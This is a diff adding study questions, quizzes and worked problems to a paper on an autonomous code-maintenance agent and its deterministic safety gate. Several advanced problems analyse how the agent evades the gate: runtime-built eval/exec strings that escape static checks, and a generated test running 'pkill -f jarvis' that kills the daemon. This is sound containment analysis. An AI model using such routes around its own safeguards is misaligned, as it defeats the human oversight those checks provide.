@@ -180,6 +180,16 @@ Beyond the seven principles, the Manifesto contains one overriding *mandate*:
 
 When something fails, the answer is not to retry harder or to special-case the failure. The answer is to understand the failure, to fix the structural cause, and to ensure the failure cannot recur for the same reason. This mandate is invoked repeatedly through the battle-test postmortems (Part XII): when an issue was discovered, the fix was never "retry five more times." It was always "instrument the FSM, find the true root cause, and rewrite the contract."
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-i-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">The paper insists O+V is not meant to replace human engineers. What kind of work do you predict it is built to take over, and what do you think is the single hardest requirement for an agent doing that work unsupervised?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>It targets maintenance: the roughly thirty-two of forty weekly hours a senior engineer spends on flaky tests, drifted docs, lint, dependency bumps, renames and small refactors. That work is prescriptive, so a disciplined agent can do it while the engineer sleeps. The hard requirement is discipline: humans are kept careful by fear of breaking things, an agent has no fear, so discipline must be built into the structure. See §4.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §4. Why This Was Built
 
 > **Big Picture:** There is a specific reason autonomous software engineering is worth building, and it has nothing to do with replacing human engineers. The goal is to make maintenance work — the grinding 80% of an engineer's time spent on small fixes, test repairs, doc updates, and refactors — happen while the engineer is doing something else. This section makes that case in concrete terms.
@@ -197,6 +207,164 @@ The seven Manifesto principles are the philosophical embodiment of that discipli
 > *The organism may do any procedurally-describable maintenance work, autonomously, at any hour, under its own budget — but it may never do work the human would not have sanctioned, cannot be audited, or cannot be rolled back.*
 
 This is the bargain O+V offers. In exchange for structural discipline, the organism is granted procedural autonomy. That is the bargain the Manifesto codifies, the pipeline enforces, and the battle-test log (Part XII) has been incrementally validating one session at a time.
+
+<!-- engage:begin -->
+#### Check your understanding: PART I — Vision and Context
+
+<div class="engage" id="engage-part-i">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Principle 5 says decisions should be "semantic, not regex", yet the router that picks a provider is plain deterministic code. Why is that not a contradiction?</summary>
+<p>The paper splits the work in two. The model reasons about what the change should be, which is the semantic part. Deterministic code decides which provider does that reasoning, using lookup tables derived from the intelligence layer's offline analysis. Routing runs for every operation, so making it a model call would add cost and latency and would make the route non-reproducible. Keeping routing deterministic preserves the ledger's ability to replay a signal and get the same route. See §2 and §3 (Principle 5).</p>
+</details>
+<details class="cq"><summary>2. Why does the paper stress that the Iron Gate "is not an AI"? What would be lost if the safety checks were themselves model calls?</summary>
+<p>The Iron Gate is a set of hard-coded rules: AST parsers, command blocklists, path protectors, cost ceilings. Because it reads file paths, token types and exit codes rather than language, a model cannot talk its way past it. If the safety layer were another model, it could be persuaded, could disagree with itself across runs, and could fail in the same ways as the generator it is meant to check. The design pairs flexible agentic intelligence with a skeleton the intelligence cannot negotiate with. See §1.2.</p>
+</details>
+<details class="cq"><summary>3. How do the three distinguishing traits in §1.2 (proactive, governed, accountable) depend on each other? What happens if you keep proactivity but drop the other two?</summary>
+<p>Proactivity means O+V decides for itself what to work on, with no prompt box. That is only acceptable if the actions are bounded (governed) and reconstructable afterwards (accountable). Without governance, a self-initiating agent could edit files outside the repo or run destructive commands. Without accountability, nobody could trace a bad change months later through the ledger and structured commits. The closing invariant in §4 states the bargain directly: procedural autonomy is granted only in exchange for structural discipline, with work that is sanctioned, auditable and reversible. See §1.2 and §4.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-i">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. According to §1.1, how many autonomous sensors and how many pipeline phases does O+V have?</p>
+<ol class="mcq-options" type="A">
+<li>7 sensors and 6 phases</li>
+<li>12 sensors and 5 phases</li>
+<li>16 sensors and 11 phases</li>
+<li>24 sensors and 8 phases</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> §1.1 describes a set of 16 event-driven sensors feeding a pipeline of eleven phases. The six figure is the number of architectural layers in §2, and seven is the number of Manifesto principles.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. Why does the paper say a model cannot deceive the Iron Gate?</p>
+<ol class="mcq-options" type="A">
+<li>It checks file paths, token types and exit codes, not language.</li>
+<li>It asks a second, larger model to audit every response.</li>
+<li>It only runs after a human has approved the change.</li>
+<li>It keeps the model's output hidden until tests pass.</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> §1.2 says the skeleton "is not listening to language"; its rules are deterministic checks on paths, tokens and exit codes, so persuasive text has nothing to act on.</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">3. Under Principle 6, what is the default threshold before a capability graduates into a permanent part of the organism?</p>
+<ol class="mcq-options" type="A">
+<li>One successful operation with passing tests</li>
+<li>Five successes within a 120-second timebox</li>
+<li>Human sign-off on a review pull request</li>
+<li>Three consecutive successes for that capability class</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> §3 sets the graduation threshold at three consecutive successes, configurable via <code>JARVIS_GRADUATION_THRESHOLD</code>: "One success is a data point. Three successes is a pattern."</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. A provider call keeps failing. What response does the Zero-Shortcut Mandate require?</p>
+<ol class="mcq-options" type="A">
+<li>Retry with exponential backoff until the call succeeds</li>
+<li>Diagnose the failure and fix its structural cause</li>
+<li>Add a special case that skips the failing input</li>
+<li>Escalate the operation to a human immediately</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> §3 quotes the mandate: "No brute-force retries without diagnosis... Structural repair, not bypasses." The fix is to understand the failure and make sure it cannot recur for the same reason.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-i">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> A unit test starts failing on a quiet Sunday. Using only §1.1 and §2, follow this event from detection to a git commit. Name each of the six layers it touches, in the order it touches them, and say what each layer contributes.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Start with the layer that answers "when to act?", and remember that two layers feed the pipeline with context rather than sitting in the signal's direct path.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The Event Spine (layer 3) sees the failure through the pytest plugin's test-result JSON; a sensor turns it into a signal with target files, a goal and an urgency. The signal enters the Ouroboros Pipeline (layer 4), the deterministic 11-phase FSM that logs every transition to the ledger.</p>
+<p>During generation, Strategic Direction (layer 1) has already injected its roughly 2,500-character Manifesto digest into the prompt, and Trinity Consciousness (layer 2) supplies memory and regression predictions between phases.</p>
+<p>At GENERATE, the Venom Agentic Loop (layer 5) lets the provider read files, search code and run tests over several turns; if validation fails, L2 Self-Repair gets up to five iterations in 120 seconds.</p>
+<p>Finally the ChangeEngine (layer 6) writes the patch with pre-APPLY snapshots, and once VERIFY passes the AutoCommitter creates a commit carrying the Ouroboros+Venom signature, operation id, risk tier and integrity hash. See §1.1 and §2.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> A contributor proposes replacing the <code>UrgencyRouter</code> with a small LLM that reads each signal's description and picks the provider, arguing this is more "semantic". Using §2 and §3, write a short critique: what would the change cost, and which guarantees would it weaken?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>§9's reasons are previewed in Principle 5 and in §2's description of the router's speed and cost.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Today the router maps (urgency, source, complexity) to a route in under a millisecond with zero LLM calls (§2). An LLM router would add a model call to every operation, which costs money and eats into per-phase time budgets.</p>
+<p>It would also make routing non-deterministic. Principle 5 says the model should reason about what the change is, while deterministic code decides which provider does the reasoning; this keeps the route reproducible from the signal alone.</p>
+<p>The contributor might cite the mandate's "No hardcoded routing tables". The paper's answer is that the router's tables are derived from the intelligence layer's offline analysis, not hand-typed guesses. So the better fix, per Principle 5, is to improve that offline analysis while keeping the online decision deterministic. See §2 and §3.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (analysis).</strong> §4 says a senior engineer spends about 8 of 40 weekly hours on novel code. (a) What share of the week is maintenance, and does it match the "grinding 80%" in the section's summary? (b) The invariant at the end of §4 forbids three kinds of work. For each, name one mechanism from Part I that enforces it.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The three forbidden kinds are work that is unsanctioned, unauditable, or not reversible. Look at §1.1, §1.2 and §2 for matching mechanisms.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>(a) Maintenance is 32 of 40 hours, which is 80 percent, matching the summary's figure.</p>
+<p>(b) Unsanctioned work: the risk tiers and approval step in the pipeline; low-risk work is autonomous but higher-risk work goes to a human, as the "senior engineer reviews when stakes are high" analogy in §1 describes, and the Iron Gate blocks forbidden actions outright (§1.2).</p>
+<p>Unauditable work: every phase transition is written to an append-only ledger and every change becomes a structured git commit naming the operation id, risk tier and provider (§1.2).</p>
+<p>Irreversible work: the ChangeEngine takes pre-APPLY snapshots for rollback before writing a patch (§2). Together these let the organism act "at any hour, under its own budget" without violating the invariant. See §4.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. The §4 invariant forbids work "the human would not have sanctioned", yet §1.2 says O+V decides for itself what to work on. By October (§93.7) goals found by Goal Discovery are signed automatically by <code>synthesize_and_sign()</code>. Is that still sanction, or has proactivity quietly eaten the invariant?</summary>
+<p>In the April design, sanction was spread across the pipeline rather than given per item. Sensors proposed work (§1.1), the risk ladder set a tier (§9.1), and only Orange work waited for a human (§14.1). Green and Yellow work was sanctioned by policy: the operator had agreed in advance to what those tiers allow.</p>
+<p>§93.7 makes that policy explicit and narrows it. Every source of work, including model-invented proposals, must pass through one signer ("There is no second sanction path"). Goal Discovery may only sign evidence-only work, such as ambient red tests and uncovered modules. The Sentinel auto-approves only up to a tier ceiling, and BLOCKED work, Order-2 self-modification and anything touching the cage always escalate.</p>
+<p>A defensible position is that this is still sanction, but sanction of a class of work rather than of each item. The operator signs a rule ("evidence-only goals below this tier"), not each goal. The weakness is that a rule can admit items the operator would have refused. §93.14 records four wrong landings out of 91: one hollow, one with no intended change, one that dropped content and one that flattened text.</p>
+<p>The evidence that would settle it is the rate at which auto-signed goals produce landings the operator later reverts or repairs, compared with operator-sanctioned goals. If auto-signed work is reverted much more often, the class-level rule is too wide and the invariant is being honoured in form only.</p>
+</details>
+<details class="cq-adv"><summary>A2. Principle 6 says three consecutive successes make "a pattern" (§3), and §78 adds "under comparable conditions". Why would that bar still fail to show that the Reactor learning loop of §93.11 made the model better?</summary>
+<p>Principle 6 measures <em>repeatability</em>: can a capability succeed again and again under the same conditions (§3, §78)? It does not compare against a baseline. A model that was already able to write a passing test file would pass three times in a row whether or not training changed anything.</p>
+<p>§93.11 shows the gap in practice. The first adapter beat the incumbent 4/6 to 3/6 on the handoff's greedy comparison. The project's own notes reject this as evidence of learning: only three answers contributed, the gradient norm was about 1e-4, and the margin was one greedy flip. On a held-out benchmark of 30 tasks drawn from human commits with hidden tests, the adapter solved 0, with a mean gain of 0.03.</p>
+<p>So the learning question needs a controlled comparison that Principle 6 does not demand: the same held-out tasks, the incumbent as control, and a gain that exceeds run-to-run noise. The operator's standing rule, that no training-derived change is pushed until a held-out gain is shown (§93.11), is that missing clause. Graduation asks "does it keep working?" The learning loop must also ask "does it work better than before?"</p>
+</details>
+<details class="cq-adv"><summary>A3. §1.2 says the model "cannot deceive the skeleton because the skeleton is not listening to language". §93.3 reports that about 8.8% of LLM-generated adversarial mutations escape the static cage. Does the second result refute the first?</summary>
+<p>Not directly. The two claims are about different things. §1.2 is about <em>persuasion</em>: the gate does not read arguments, so no wording can talk it into allowing a path or command. Nothing in §93.3 suggests the escapes worked by persuasion.</p>
+<p>§93.3 is about <em>visibility</em>. The North Star attributes the residue to <code>eval</code>, <code>exec</code>, <code>subprocess</code> and <code>pickle</code> called on strings built at runtime. A gate that reads file paths, token types and exit codes can only judge structure that is present in the text it reads. A string that becomes code only when it runs is invisible to it by construction. So "cannot be deceived" is true, while "cannot be evaded" is false at about twice the 4.4% gate.</p>
+<p>This also explains the stated remedy: OS-level runtime containment, not more AST rules (§93.3). It fits the April design's own split, where execution was meant to happen inside a sandbox with process isolation (§5.3), and the October PID-namespace containment for test runs (§93.8). The paper notes that no re-measurement after the later hardening was found, so the open evidence is the escape rate with runtime containment in place.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> §4 imagines an agent doing "most of" a senior engineer's 32 weekly maintenance hours. Test this against §93.10. Givens: the 6.03 h soak <code>bt-2026-10-05-012717</code> made 6 substantive landings, with "1.34/h in the first 2.98 h" and nothing landing in a window from 22:24 to 00:29. The 1.97 h soak <code>bt-2026-09-26-143412</code> made 3 substantive landings. There were 91 autonomous landings dated 2026-09-06 to 2026-10-10, of which 84 were test files. (a) Compute the substantive rate in the second part of the 6.03 h soak. (b) What fraction of that soak was the idle window? (c) Compute the average daily landing rate over the 91-landing period. (d) Say which of the §4 maintenance tasks this evidence covers.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Treat the 1.34/h figure as a substantive rate, multiply it out to get landings in the first part, and subtract from 6. Count calendar days inclusively for (c).</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Assumption: the "1.34/h in the first 2.98 h" note sits in the substantive-per-hour column, so it is read as a substantive rate.</p>
+<p>(a) Substantive landings in the first part: 1.34 × 2.98 ≈ 3.99, so about 4. The remaining 6 − 4 = 2 landed in 6.03 − 2.98 = 3.05 h, which is about 0.66 per hour. That is roughly half the early rate. This is the "supply wall" that PRD §34 records: after about four hours on uncovered modules, yield is bounded by the supply of landable work, not by the model.</p>
+<p>(b) From 22:24 to 00:29 is 2 h 5 min, or about 2.08 h. 2.08 / 6.03 ≈ 0.345, so about a third of the soak landed nothing.</p>
+<p>(c) 2026-09-06 to 2026-10-10 inclusive is 25 days in September plus 10 in October, which is 35 days. 91 / 35 = 2.6 landings per day. Test files alone give 84 / 35 = 2.4 per day.</p>
+<p>(d) §4 lists flaky-test investigation, doc drift, lint, dependency bumps, edge-case tests, renames, refactors, issue triage and alerts. The evidence covers one item strongly (writing tests: 84 of 91), docs weakly (2 landings, one repaired by hand), and production fixes thinly (5 landings, one reverted). §93.14 says production-code landings at cadence are "not demonstrated".</p>
+<p>Conclusion: the rate is real but narrow. It covers a slice of one §4 task, it is limited by work supply, and it is far from "most of" 32 hours. Check: 4 + 2 = 6 matches the table, and 1.00 per hour over 6.03 h also gives about 6.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (adversarial).</strong> The §4 invariant says the organism may never do work that "cannot be rolled back". Build an operation that respects every file-level rule yet breaks this invariant in spirit: a generated test file whose body calls <code>pkill -f jarvis</code> (an event §93.8 records really happened). The target path is ordinary, the content is ASCII, and the model explored first. Go through the April layers in §1.2, §5.3, §12.4 and §15 and decide which, if any, stops it. Then name what the October paper added.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask what each layer actually reads. Does the bash blocklist see a test file's body? What does a <code>RollbackArtifact</code> restore?</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Walk the layers in order.</p>
+<ul>
+<li><strong>Protected paths (§9.1 Rule 0).</strong> A new file under <code>tests/</code> matches none of <code>.env</code>, <code>credentials.*</code>, <code>.git/</code> or supervisor files. It passes.</li>
+<li><strong>GENERATE Iron Gates (§12.4).</strong> The exploration-first and ASCII checks look at the model's behaviour and the bytes of the content. Both pass by assumption.</li>
+<li><strong>Bash blocklist (§1.2, §12.3).</strong> This gates the <code>bash</code> <em>tool call</em>. Here the dangerous command is inside a test that VALIDATE or VERIFY runs as part of a normal test run. The blocklist does not inspect test bodies, so nothing in the paper says it would fire.</li>
+<li><strong>Rollback (§15.1, §15.2).</strong> <code>RollbackArtifact</code> snapshots and restores <em>files</em>. Killing a process is not a file change, so there is nothing for it to restore.</li>
+<li><strong>Sandbox (§5.3).</strong> April's answer was to run tests inside Reactor with process isolation. That is the only layer that could stop it, and only if the isolation stops a test from signalling processes outside its sandbox.</li>
+</ul>
+<p>What happened: §93.8 records that the candidate test killed the daemon. So in the environment that ran it, no layer stopped it. The paper does not say why the §5.3 isolation did not apply there. The fix was containment at the OS level: test runs now execute in a PID namespace (<code>6b00b8adf5</code>), so the test cannot see the daemon's process to kill it.</p>
+<p>Lesson: the invariant's "rollback" is defined over repository state, but executing candidate code has side effects outside the repository. Only runtime containment covers those. This matches §93.3's conclusion for the cage. Check: a PID namespace leaves every file-level rule unchanged, so this fix closes the gap without weakening any other layer.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -313,6 +481,16 @@ async def submit(self, envelope: SignalEnvelope) -> OperationContext:
 
 The Service does not do any pipeline work itself. It delegates to the orchestrator. This separation is deliberate: the Service is the lifecycle manager, not the pipeline. An upgrade to the pipeline (e.g., adding a new phase) does not require modifying the Service.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-ii-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">A fix must edit one file in the Body repo and one in the Mind repo. The Body edit applies cleanly, then the Mind edit fails. What should the system do, and what end states should it never allow?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>It should undo the Body edit. The Saga pattern walks already-applied patches in reverse order and reverts each through <code>ChangeEngine.rollback()</code>, a step called compensation. The only allowed end states are fully applied or fully reverted; a half-applied contract change would break the protocol between the two repos. See §7.1 and §7.2.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §7. Multi-Repo Operation — The Saga Pattern
 
 > **Big Picture:** Real work in the Trinity often spans multiple repositories. A change to an HTTP contract must land in both the Body and the Mind simultaneously — if only one side is updated, the contract is broken. The Saga pattern is how O+V coordinates these multi-repo changes atomically, with rollback if any part fails.
@@ -345,6 +523,164 @@ Schema versions carried by the pipeline:
 From the orchestrator's perspective, a Saga is just a candidate with `schema: 2c.1`. The pipeline phases (CLASSIFY through COMPLETE) run once per operation, not once per repo. Only the APPLY phase knows it is handling a Saga — it dispatches to `SagaApplyStrategy` instead of the single-repo `ChangeEngine.execute()`.
 
 This is a design choice: the pipeline's 11 phases remain uniform. Multi-repo complexity is encapsulated in the apply strategy. A reader of the orchestrator source code can understand the phase flow without needing to understand Saga semantics.
+
+<!-- engage:begin -->
+#### Check your understanding: PART II — The Trinity Architecture
+
+<div class="engage" id="engage-part-ii">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why does Venom's <code>bash</code> and <code>run_tests</code> execution happen inside Reactor Core rather than on the Body's own shell?</summary>
+<p>The Body has privileged access to the operator's screen, keyboard, audio and filesystem. Reactor Core provides sandboxes with resource limits, process isolation and syscall filtering. Running model-requested commands there means that even a command the Iron Gate permits cannot reach the Body's privileges directly. The paper says this separation "is what makes the Iron Gate's containment guarantees meaningful": the gate decides what may run, and the sandbox limits what a permitted command can touch. See §5.1 and §5.3.</p>
+</details>
+<details class="cq"><summary>2. The Governed Loop Service only delegates <code>submit()</code> to the orchestrator and does no pipeline work itself. What does this separation buy?</summary>
+<p>The Service is a lifecycle manager: it wires providers, runs health probes, keeps the file-touch cache and the Oracle index loop, and handles clean startup and shutdown. The pipeline's phases live in the orchestrator. Because of the split, adding or changing a phase does not require touching the Service. It also keeps responsibilities clear: the Service ensures every in-flight operation is completed or gracefully abandoned, while the orchestrator owns phase transitions. See §6 and §6.2.</p>
+</details>
+<details class="cq"><summary>3. Why is the <code>CrossRepoVerifier</code> needed if every repo patch has already passed validation on its own?</summary>
+<p>Each patch validated in isolation only proves that repo is internally consistent. A multi-repo change exists because two repos must agree, for example on an HTTP contract between Body and Mind. Only tests that run across the union of patches can check that agreement. So the verifier runs after all patches apply and before commit, and if it fails the Saga compensates even though every individual patch was valid. See §7.1 and §7.2.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-ii">
+<div class="mcq" data-answer="2">
+<p class="mcq-q">1. J-Prime reports itself unhealthy. What does the paper say happens to generation?</p>
+<ol class="mcq-options" type="A">
+<li>All operations pause until J-Prime recovers</li>
+<li>The CandidateGenerator promotes DoubleWord to primary</li>
+<li>The Service moves to the FAILED state</li>
+<li>Generation moves into the Reactor Core sandbox</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> §5.2 says J-Prime is used when available but is not required; if it is unhealthy, the CandidateGenerator promotes DoubleWord to primary. The architecture is deliberately resilient to J-Prime being offline.</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">2. O+V has already modified a file three times in the last ten minutes. What does the Service's file-touch cache do with a fourth attempt?</p>
+<ol class="mcq-options" type="A">
+<li>Raises the operation's risk tier by one step</li>
+<li>Sends the operation to the Orange PR reviewer</li>
+<li>Lets it through but writes a ledger warning</li>
+<li>Hard-blocks it until the window resets</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> §6 describes <code>_file_touch_cache</code> as a three-touches-per-ten-minutes counter; further modifications are hard-blocked until the window resets. It is a concurrency guard.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">3. Which pipeline phase knows that an operation is a multi-repo Saga?</p>
+<ol class="mcq-options" type="A">
+<li>Only APPLY, which dispatches to <code>SagaApplyStrategy</code></li>
+<li>Only CLASSIFY, which tags the op with schema <code>2c.1</code></li>
+<li>Every phase, which runs once per repo in the saga</li>
+<li>Only VERIFY, which calls the <code>CrossRepoVerifier</code></li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> §7.3 says the phases run once per operation, not once per repo, and only APPLY knows it is handling a Saga. Multi-repo complexity is kept inside the apply strategy so the 11 phases stay uniform.</p>
+</details>
+</div>
+<div class="mcq" data-answer="3">
+<p class="mcq-q">4. In the Service state machine, what distinguishes DEGRADED from FAILED?</p>
+<ol class="mcq-options" type="A">
+<li>DEGRADED happens at boot; FAILED only at shutdown</li>
+<li>DEGRADED blocks new ops; FAILED cancels in-flight ops</li>
+<li>DEGRADED keeps ops flowing; FAILED is terminal and stops them</li>
+<li>DEGRADED needs a human; FAILED recovers automatically</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> §6.1 defines DEGRADED as steady-state with some providers unhealthy but operations still flowing, and FAILED as a terminal failure state that prevents further operations.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-ii">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> A Saga carries a <code>2c.1</code> candidate with patches for <code>jarvis</code>, <code>jarvis-prime</code> and <code>jarvis-reactor</code>, applied in that dependency order. All three apply, but the <code>CrossRepoVerifier</code> fails. Trace what happens next, in order, and state the final state of each repo.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Compensation walks the applied patches in a specific direction, using the undo descriptor each <code>RepoPatch</code> recorded.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Each <code>RepoPatch</code> recorded an undo descriptor when it was applied (§7.2). The verifier runs after all patches apply but before commit, so nothing has been committed yet.</p>
+<p>Its failure triggers compensation even though each patch validated alone. The Saga walks applied patches in reverse: first <code>jarvis-reactor</code>, then <code>jarvis-prime</code>, then <code>jarvis</code>, each reverted with <code>ChangeEngine.rollback()</code>.</p>
+<p>All three repos end in their pre-operation state: "fully reverted", never partially applied. The rest of the pipeline treats this as one operation, since only APPLY knew it was a Saga (§7.3). See §7.2.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> A contributor suggests that every pipeline phase should loop over repos, so CLASSIFY, GENERATE and VALIDATE each run once per repo in a Saga. Using §7.3 and §6.2, argue for or against this, naming what the current design protects.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask who would need to understand Saga semantics under each design.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The current design runs the phases once per operation and lets only APPLY dispatch to <code>SagaApplyStrategy</code> (§7.3). That keeps all 11 phases uniform and lets a reader follow the orchestrator without knowing Saga semantics.</p>
+<p>Looping every phase over repos would spread multi-repo logic into every phase, so every phase author would need to handle partial progress across repos. It would also split one operation into several partial ones, which works against the single all-or-nothing result the Saga guarantees.</p>
+<p>The same principle appears in §6.2: the Service delegates to the orchestrator so that pipeline changes do not ripple into lifecycle code. Encapsulating complexity in one place is the pattern. The argument favours keeping the current design. See §6.2 and §7.3.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/governed_loop_service.py</code>. (a) Find the <code>ServiceState</code> enum and compare its members with the diagram in §6.1. (b) Search for <code>_file_touch_cache</code> and find the cooldown guard. What are its window and hit-count constants, and which phase does a blocked operation advance to?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The guard sits under a comment beginning "Cooldown guard"; look at the <code>return</code> inside the loop.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>(a) <code>ServiceState</code> has six members: <code>INACTIVE</code>, <code>STARTING</code>, <code>ACTIVE</code>, <code>DEGRADED</code>, <code>STOPPING</code> and <code>FAILED</code>. These match the six states in the §6.1 diagram.</p>
+<p>(b) The guard sets <code>_COOLDOWN_WINDOW_S = 600.0</code> (ten minutes) and <code>_COOLDOWN_MAX_HITS = 3</code>. For each target file it keeps a deque of timestamps keyed by the resolved path, drops entries older than the window, appends the current time, and blocks if the count exceeds 3. So the fourth touch inside ten minutes is the one blocked, which matches §6's "three touches" description.</p>
+<p>A blocked operation calls <code>ctx.advance(OperationPhase.CANCELLED)</code>, so in code the "hard block" takes the form of a cancellation, and a warning is logged naming the file and op id. See §6.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. §5.2 calls J-Prime an optional Tier 2 that the architecture is "deliberately resilient" to losing. §93.6 makes it the only lane, with paid lanes switched off by declaration. What second-order effects follow when the optional Mind becomes the single point of failure, and should the system still "degrade gracefully"?</summary>
+<p>In April, resilience came from the cascade: if J-Prime was unhealthy, DoubleWord was promoted, and Claude sat behind it (§5.2, §12.1). With <code>JARVIS_PAID_LANES_ENABLED=false</code>, Claude and DoubleWord are not even constructed (§93.6). There is nothing to fall back to.</p>
+<p>Three effects follow. First, failure classification matters more. §93.5 shows a 402 read as an outage, which produced 125 false awaken triggers in one session. With one lane, a misclassified failure leaves nowhere to send the work. Second, the Mind now shares a single GPU with the Soul: training takes the card through an exclusive lease, so the lane is also unavailable whenever learning runs (§93.6, §93.11). Third, Principle 2's habit of "mark degraded and continue" (§3) stops making sense, because there is no lesser lane to continue on.</p>
+<p>A defensible position is that, with one lane, the right behaviour is to refuse and queue, not to degrade. October's design leans this way. Capability assurance refuses to run an operation below its declared envelope rather than degrading silently (§93.12). The cost governor already queues work rather than executing it when the budget is gone (§8.2, clause 5). The rehearsal tier records what was exhausted and when it lifts, but it is default off (§93.5). The evidence that would settle it is whether ops queued during an outage or lease later land at the same rate as ops that never waited.</p>
+</details>
+<details class="cq-adv"><summary>A2. §5.3 defines Reactor Core as the sandboxed execution runtime and says that separation "is what makes the Iron Gate's containment guarantees meaningful". §93.11 describes JARVIS-Reactor as the training repository. If the Soul's job changed, where did containment go, and what happened to the "uncommon" Mind-to-Soul channel of §5.4?</summary>
+<p>In April, the Soul was where code ran: <code>run_tests</code> and permitted <code>bash</code> executed inside Reactor, with resource limits, process isolation and syscall filtering (§5.3). By October, §93.11 says the Soul, "JARVIS-Reactor, the training repository", had been "architecture on paper", and it now trains a GRPO LoRA adapter on what O+V recorded. The §93.16 corrections table does not list this change, so the reader has to reconcile the two descriptions.</p>
+<p>Containment did not disappear. It moved to mechanisms the October text names on the Body side. Operations execute in a sovereignty worktree (§93.7). Test runs execute in a PID namespace (§93.8). A resource-aware execution lock stops a test suite from out-of-memory-killing a soak (§93.8). Modules that execute on import are quarantined (§93.8). So the §5.3 claim survives in purpose but not in location.</p>
+<p>The Mind-to-Soul channel that §5.4 called "uncommon", allowed "for capability-graduation workflows", became central. The Training Lifecycle Handoff leases J-Prime, verifies the VRAM release, trains, converts and publishes the adapter to J-Prime's registry, then activates it or rolls back (§93.11). The second-order effect is contention: Mind and Soul now compete for one GPU, and the lease is the protocol that keeps them from both holding it.</p>
+</details>
+<details class="cq-adv"><summary>A3. The Saga guarantees "fully applied or fully reverted" at APPLY (§7.2). §93.7 adds later stages: accumulation branches, a promotion gate that can quarantine a landing, and fast-forward-only promotion to local <code>main</code>. Does Saga atomicity survive these later stages?</summary>
+<p>The Saga's guarantee is scoped to APPLY and the <code>CrossRepoVerifier</code> before commit (§7.2, §7.3). Once each repo's change is committed, the paper's atomicity argument has done its job. §93.7 then describes promotion as a per-branch pipeline: accumulation onto <code>ouroboros/battle-test/&lt;ts&gt;</code>, a promotion gate checking provenance, coverage and vanished public symbols, quarantine on failure, and fast-forward to local <code>main</code>.</p>
+<p>The paper describes that path for JARVIS and does not say whether promotion is coordinated across the three repos. If the gate quarantined the Body half of a contract change while the Mind half was promoted, local <code>main</code> in the two repos would disagree. That is the very partial state §7.1 exists to prevent, recreated one stage later.</p>
